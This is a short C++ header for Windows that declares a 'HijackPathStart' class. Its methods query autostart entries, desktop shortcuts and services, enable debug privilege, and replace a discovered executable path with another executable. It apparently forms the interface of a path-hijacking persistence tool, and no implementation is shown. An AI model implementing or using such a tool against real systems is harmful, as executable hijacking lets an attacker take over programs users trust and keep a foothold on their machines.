#pragma once
#include <Windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <tchar.h>
#include <fstream>

using namespace std;

class HijackPathStart
{
public:
	HijackPathStart(const char* szReplaceExePath);
	~HijackPathStart();
	BOOL QueryAutoStart();
	BOOL QueryDesktopShortcut();
	BOOL QueryService();
	BOOL EnableDebugPriv(LPCSTR name);
	BOOL HijactPath(string strbeReplacePath, const char* szReplaceExePath);


private:
	vector<string> vsHijcakPathList;
};

